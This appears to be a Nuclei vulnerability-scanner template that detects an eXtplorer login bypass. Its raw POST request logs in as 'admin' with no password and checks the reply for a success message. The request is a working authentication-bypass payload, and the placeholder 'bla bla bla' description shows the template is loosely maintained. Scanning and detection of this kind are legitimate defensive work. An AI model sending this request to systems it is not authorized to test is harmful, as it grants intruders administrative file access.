http:
- matchers:
  - part: header
    type: word
    words:
    - 'Set-Cookie: eXtplorer='
  - part: body
    type: word
    words:
    - message':'Login successful!
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST {{Path}}/index.php HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101
    Firefox/125.0

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    Accept: */*

    X-Requested-With: XMLHttpRequest

    Referer: {{Hostname}}

    Origin: {{Hostname}}


    option=com_extplorer&action=login&type=extplorer&username=admin&lang=english

    '
id: extplorer-login-bypass
info:
  author: otterly
  classification:
    cvss-score: 10
  description: bla bla bla
  metadata:
    max-request: 1
  name: eXtplorer login bypass
  severity: critical
  tags: login,login-byppas
